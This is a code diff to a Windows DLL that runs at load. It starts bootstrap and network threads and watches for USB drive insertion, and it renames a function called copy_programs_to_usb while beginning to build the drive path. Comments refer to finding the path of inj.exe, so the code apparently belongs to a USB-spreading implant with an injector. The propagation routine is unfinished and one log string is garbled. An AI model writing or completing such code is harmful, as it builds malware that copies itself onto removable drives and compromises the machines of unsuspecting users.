@@ -65,7 +65,8 @@ vector<LOCAL_DRIVE_T> local_drives_;
 float local_bootstrap_version_ = 0.0f;
 BOOL isFirstDataPacket_ = TRUE;
 FILE *bootstrapHandle_ = NULL;
-
+HMODULE hCurrentModule_ = NULL;
+char currentDllPath_[512] = { 0 };
 void *loger_ = NULL;
 
 /*1.Being used to listen usb event, when usb inserted into computer,
@@ -178,9 +179,19 @@ unsigned __stdcall localProc(void* pArguments)
 	return 0;
 }
 
+
+
+
+
+
 //copy programs into usb 
-void copy_programs_to_usb(char usb)
+void onUsbInsert(char usb)
 {
+#define SUFFIX ":\\"
+	char usb_path[20] = { 0 };
+	usb_path[0] = usb;
+	strcat(usb_path, SUFFIX);
+
 
 }
 
@@ -194,7 +205,7 @@ LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
 			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
 				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
 				log_write(loger_, "∞°°≠°≠%c≈Ã≤ÂΩ¯¿¥¡À\n", 'A' + l);
-				copy_programs_to_usb(l + 'A');
+				onUsbInsert(l + 'A');
 			}
 		}
 		else if ((DWORD)wp == DBT_DEVICEREMOVECOMPLETE) {
@@ -632,11 +643,12 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 
 void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
-
+	hCurrentModule_ = hModule;
 	loger_ = log_create(LOG_FILE);
 	isVistaLaterOS_ = IsVistaOrLater();
-
-	log_write(loger_, "os version 0x%x \n", get_os_version());
+	GetModuleFileName(hCurrentModule_, currentDllPath_, 512);
+	log_write(loger_, "current dll path: %s\r\n", currentDllPath_);
+	log_write(loger_, "os version 0x%x \r\n", get_os_version());
 	InitNetwork();
 	//listen on localhost machine  for geting the path of inj.exe 
 	unsigned threadID1, threadID2, threadID3;
